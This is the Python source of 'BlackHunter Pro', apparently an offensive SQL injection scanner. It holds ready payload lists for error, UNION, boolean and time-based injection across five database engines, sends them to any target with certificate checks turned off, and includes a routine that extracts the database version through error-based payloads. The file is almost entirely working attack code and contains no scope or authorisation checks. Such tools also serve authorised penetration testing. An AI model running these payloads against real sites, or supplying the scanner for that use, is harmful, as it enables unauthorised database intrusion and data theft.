# vulns/sqli.py
# BlackHunter Pro - SQL Injection Scanner
# Detects: Error-based, Union-based, Boolean-based, Time-based

import re
import time
import requests
from urllib.parse import urlparse, urljoin, parse_qs, urlencode
from colorama import Fore, Style

import warnings
warnings.filterwarnings("ignore")


class SQLiScanner:
    """
    SQL Injection Scanner
    - Error-based detection (MySQL, MSSQL, PostgreSQL, Oracle, SQLite)
    - Union-based detection
    - Boolean-based blind detection
    - Time-based blind detection
    - Data extraction capabilities
    """

    # =============================================
    # ERROR PATTERNS
    # =============================================

    ERROR_PATTERNS = {
        'MySQL': [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_",
            r"MySQLSyntaxErrorException",
            r"valid MySQL result",
            r"check the manual that (corresponds to|fits) your MySQL server version",
            r"Unknown column '[^']+' in 'field list'",
            r"MySqlClient\.",
            r"com\.mysql\.jdbc",
            r"SQLSTATE\[42000\]",
        ],
        'PostgreSQL': [
            r"PostgreSQL.*ERROR",
            r"Warning.*\Wpg_",
            r"valid PostgreSQL result",
            r"PG::SyntaxError",
            r"org\.postgresql\.util\.PSQLException",
            r"ERROR:\s+syntax error at or near",
            r"ERROR:\s+parser: parse error at or near",
        ],
        'MSSQL': [
            r"Driver.*SQL[\-\_\ ]*Server",
            r"OLE DB.*SQL Server",
            r"\bSQL Server[^&lt;&quot;]+Driver",
            r"Warning.*mssql_",
            r"System\.Data\.SqlClient\.SqlException",
            r"ODBC SQL Server Driver",
            r"SQLServer JDBC Driver",
            r"com\.jnetdirect\.jsql",
        ],
        'Oracle': [
            r"\bORA-[0-9][0-9][0-9][0-9]",
            r"Oracle error",
            r"Oracle.*Driver",
            r"Warning.*\Woci_",
            r"Warning.*\Wora_",
            r"oracle\.jdbc",
            r"quoted string not properly terminated",
        ],
        'SQLite': [
            r"SQLite/JDBCDriver",
            r"SQLite\.Exception",
            r"System\.Data\.SQLite\.SQLiteException",
            r"Warning.*sqlite_",
            r"\[SQLITE_ERROR\]",
            r"SQLite error",
            r"sqlite3\.OperationalError",
        ],
    }

    # =============================================
    # SQLi PAYLOADS
    # =============================================

    ERROR_PAYLOADS = [
        "'", "\"", "')", "\")", "';", "\";", "`", "\\",
        "'--", "\"--", "'#", "\"#", "1'", "1\"",
        "' AND '1'='1", "' AND '1'='2",
    ]

    UNION_PAYLOADS = [
        "' UNION SELECT NULL-- -",
        "' UNION SELECT NULL,NULL-- -",
        "' UNION SELECT NULL,NULL,NULL-- -",
        "' UNION SELECT NULL,NULL,NULL,NULL-- -",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL-- -",
        "' UNION ALL SELECT NULL-- -",
        "' UNION ALL SELECT NULL,NULL-- -",
        "' UNION SELECT 1-- -",
        "' UNION SELECT 1,2-- -",
        "' UNION SELECT 1,2,3-- -",
        "' UNION SELECT 1,2,3,4-- -",
        "' UNION SELECT 1,2,3,4,5-- -",
    ]

    BOOLEAN_PAYLOADS = [
        ("' AND '1'='1", "' AND '1'='2"),
        ("' AND 1=1-- -", "' AND 1=2-- -"),
        ("' OR '1'='1", "' OR '1'='2"),
        ("1 AND 1=1", "1 AND 1=2"),
        ("1' AND '1'='1", "1' AND '1'='2"),
    ]

    TIME_PAYLOADS = {
        'MySQL': ("' AND SLEEP(5)-- -", 5),
        'PostgreSQL': ("' AND pg_sleep(5)-- -", 5),
        'MSSQL': ("'; WAITFOR DELAY '0:0:5'-- -", 5),
        'Oracle': ("' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -", 5),
        'SQLite': ("' AND 1=randomblob(100000000)-- -", 5),
    }

    # =============================================
    # INITIALIZATION
    # =============================================

    def __init__(self, target, timeout=10, user_agent=None):
        self.target = target.rstrip('/')
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': user_agent or 'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
        })
        self.session.verify = False

        self.vulnerabilities = []
        self.extracted_data = {
            'databases': [],
            'tables': [],
            'columns': [],
            'data': [],
        }

        self._baseline = {}
        self._detected_dbms = None

    # =============================================
    # MAIN RUN
    # =============================================

    def run(self):
        """Execute SQL injection scan"""
        print(f"{Fore.CYAN}[*] SQLi Scanner started")
        print(f"{Fore.CYAN}[*] Target: {self.target}")
        print()

        # Parse URL
        parsed = urlparse(self.target)
        params = parse_qs(parsed.query)

        if not params:
            params = self._find_form_params()

        if not params:
            print(f"{Fore.YELLOW}  [-] No parameters found")
            return []

        print(f"{Fore.CYAN}[*] Testing {len(params)} parameters: {', '.join(params.keys())}")
        print()

        # Get baseline
        self._get_baseline()

        # Test each parameter
        for param in params.keys():
            print(f"{Fore.YELLOW}[*] Testing parameter: {param}")
            self._test_parameter(param)

        return self.vulnerabilities

    # =============================================
    # FIND FORM PARAMETERS
    # =============================================

    def _find_form_params(self):
        """Extract parameters from forms"""
        params = {}

        try:
            r = self.session.get(self.target, timeout=self.timeout, verify=False)
            forms = re.findall(r'<form[^>]*>.*?</form>', r.text, re.IGNORECASE | re.DOTALL)

            for form in forms:
                inputs = re.findall(r'<input[^>]*name=["\']([^"\']+)["\']', form, re.IGNORECASE)
                for inp in inputs:
                    params[inp] = '1'
        except:
            pass

        return params

    # =============================================
    # BASELINE
    # =============================================

    def _get_baseline(self):
        """Get baseline response"""
        try:
            start = time.time()
            r = self.session.get(self.target, timeout=self.timeout, verify=False)
            elapsed = time.time() - start

            self._baseline = {
                'status': r.status_code,
                'length': len(r.text),
                'time': elapsed,
                'content': r.text[:1000],
            }
        except:
            self._baseline = {'status': 0, 'length': 0, 'time': 1, 'content': ''}

    # =============================================
    # TEST PARAMETER
    # =============================================

    def _test_parameter(self, param):
        """Test single parameter for all SQLi types"""

        # 1. Error-based
        if self._test_error_based(param):
            return

        # 2. Union-based
        if self._test_union_based(param):
            return

        # 3. Boolean-based
        if self._test_boolean_based(param):
            return

        # 4. Time-based
        if self._test_time_based(param):
            return

    # =============================================
    # ERROR-BASED
    # =============================================

    def _test_error_based(self, param):
        """Test error-based SQL injection"""
        parsed = urlparse(self.target)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        params = parse_qs(parsed.query)

        for payload in self.ERROR_PAYLOADS:
            try:
                test_params = {k: v[0] for k, v in params.items()}
                test_params[param] = test_params.get(param, '1') + payload

                r = self.session.get(base_url, params=test_params, timeout=self.timeout, verify=False)

                # Check for SQL errors
                for dbms, patterns in self.ERROR_PATTERNS.items():
                    for pattern in patterns:
                        if re.search(pattern, r.text, re.IGNORECASE):
                            self._detected_dbms = dbms

                            print(f"{Fore.RED}  [!] SQL Injection (Error-based) - {dbms}")
                            print(f"{Fore.RED}      Param: {param}")
                            print(f"{Fore.RED}      Payload: {payload}")

                            self.vulnerabilities.append({
                                'type': 'SQL Injection (Error-based)',
                                'url': r.url,
                                'param': param,
                                'payload': payload,
                                'dbms': dbms,
                                'evidence': pattern,
                                'severity': 'CRITICAL',
                            })

                            self._extract_data_error_based(param, dbms)
                            return True
            except Exception:
                continue

        return False

    # =============================================
    # UNION-BASED
    # =============================================

    def _test_union_based(self, param):
        """Test union-based SQL injection"""
        parsed = urlparse(self.target)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        params = parse_qs(parsed.query)

        for payload in self.UNION_PAYLOADS:
            try:
                test_params = {k: v[0] for k, v in params.items()}
                test_params[param] = test_params.get(param, '1') + payload

                r = self.session.get(base_url, params=test_params, timeout=self.timeout, verify=False)

                # Check for successful union
                if r.status_code == 200 and abs(len(r.text) - self._baseline['length']) > 20:
                    has_error = any(
                        re.search(p, r.text, re.IGNORECASE)
                        for patterns in self.ERROR_PATTERNS.values()
                        for p in patterns
                    )

                    if not has_error:
                        print(f"{Fore.RED}  [!] SQL Injection (Union-based)")
                        print(f"{Fore.RED}      Param: {param}")
                        print(f"{Fore.RED}      Payload: {payload}")

                        self.vulnerabilities.append({
                            'type': 'SQL Injection (Union-based)',
                            'url': r.url,
                            'param': param,
                            'payload': payload,
                            'severity': 'CRITICAL',
                        })
                        return True
            except Exception:
                continue

        return False

    # =============================================
    # BOOLEAN-BASED
    # =============================================

    def _test_boolean_based(self, param):
        """Test boolean-based blind SQL injection"""
        parsed = urlparse(self.target)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        params = parse_qs(parsed.query)

        for true_payload, false_payload in self.BOOLEAN_PAYLOADS:
            try:
                test_true = {k: v[0] for k, v in params.items()}
                test_true[param] = test_true.get(param, '1') + true_payload
                r_true = self.session.get(base_url, params=test_true, timeout=self.timeout, verify=False)

                test_false = {k: v[0] for k, v in params.items()}
                test_false[param] = test_false.get(param, '1') + false_payload
                r_false = self.session.get(base_url, params=test_false, timeout=self.timeout, verify=False)

                len_true = len(r_true.text)
                len_false = len(r_false.text)

                if abs(len_true - len_false) > 50:
                    print(f"{Fore.RED}  [!] SQL Injection (Boolean-based)")
                    print(f"{Fore.RED}      Param: {param}")
                    print(f"{Fore.RED}      Diff: {abs(len_true - len_false)} bytes")

                    self.vulnerabilities.append({
                        'type': 'SQL Injection (Boolean-based)',
                        'url': r_true.url,
                        'param': param,
                        'true_payload': true_payload,
                        'false_payload': false_payload,
                        'length_diff': abs(len_true - len_false),
                        'severity': 'CRITICAL',
                    })
                    return True
            except Exception:
                continue

        return False

    # =============================================
    # TIME-BASED
    # =============================================

    def _test_time_based(self, param, delay=5):
        """Test time-based blind SQL injection"""
        parsed = urlparse(self.target)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        params = parse_qs(parsed.query)

        for dbms, (payload, delay_sec) in self.TIME_PAYLOADS.items():
            try:
                test_params = {k: v[0] for k, v in params.items()}
                test_params[param] = test_params.get(param, '1') + payload

                start = time.time()
                r = self.session.get(
                    base_url,
                    params=test_params,
                    timeout=self.timeout + delay_sec + 5,
                    verify=False
                )
                elapsed = time.time() - start

                if elapsed >= (self._baseline.get('time', 1) + delay_sec - 1):
                    self._detected_dbms = dbms

                    print(f"{Fore.RED}  [!] SQL Injection (Time-based) - {dbms}")
                    print(f"{Fore.RED}      Param: {param}")
                    print(f"{Fore.RED}      Payload: {payload}")
                    print(f"{Fore.RED}      Delay: {elapsed:.2f}s")

                    self.vulnerabilities.append({
                        'type': f'SQL Injection (Time-based - {dbms})',
                        'url': r.url,
                        'param': param,
                        'payload': payload,
                        'dbms': dbms,
                        'delay': elapsed,
                        'severity': 'CRITICAL',
                    })
                    return True

            except requests.Timeout:
                self._detected_dbms = dbms
                print(f"{Fore.RED}  [!] SQL Injection (Time-based - Timeout) - {dbms}")
                print(f"{Fore.RED}      Param: {param}")

                self.vulnerabilities.append({
                    'type': f'SQL Injection (Time-based - {dbms})',
                    'url': self.target,
                    'param': param,
                    'payload': payload,
                    'dbms': dbms,
                    'delay': 'timeout',
                    'severity': 'CRITICAL',
                })
                return True
            except Exception:
                continue

        return False

    # =============================================
    # DATA EXTRACTION
    # =============================================

    def _extract_data_error_based(self, param, dbms):
        """Extract data via error-based injection"""
        print(f"{Fore.YELLOW}  [*] Extracting data via {dbms}...")

        parsed = urlparse(self.target)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        params = parse_qs(parsed.query)

        # Version extraction
        version_payloads = {
            'MySQL': "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))-- -",
            'MSSQL': "' AND 1=CONVERT(int,@@version)-- -",
            'PostgreSQL': "' AND 1=CAST(version() AS int)-- -",
            'Oracle': "' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT banner FROM v$version WHERE rownum=1))-- -",
        }

        if dbms in version_payloads:
            try:
                test_params = {k: v[0] for k, v in params.items()}
                test_params[param] = test_params.get(param, '1') + version_payloads[dbms]

                r = self.session.get(base_url, params=test_params, timeout=self.timeout, verify=False)

                version_match = re.search(r'~([^~]+)~', r.text)
                if version_match:
                    version = version_match.group(1)
                    self.extracted_data['databases'].append({
                        'dbms': dbms,
                        'version': version
                    })
                    print(f"{Fore.GREEN}      [+] Version: {version}")
            except:
                pass

    # =============================================
    # SUMMARY
    # =============================================

    def summary(self):
        """Print summary"""
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"{Fore.CYAN}  SQL INJECTION SUMMARY")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Vulnerabilities: {len(self.vulnerabilities)}")
        print(f"{Fore.GREEN}[+] DBMS Detected:   {self._detected_dbms or 'Unknown'}")

        for v in self.vulnerabilities:
            print(f"{Fore.RED}[!] {v['type']} - {v.get('param', 'N/A')}")

        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")


# =============================================
# EXPORTS
# =============================================

__all__ = ["SQLiScanner"]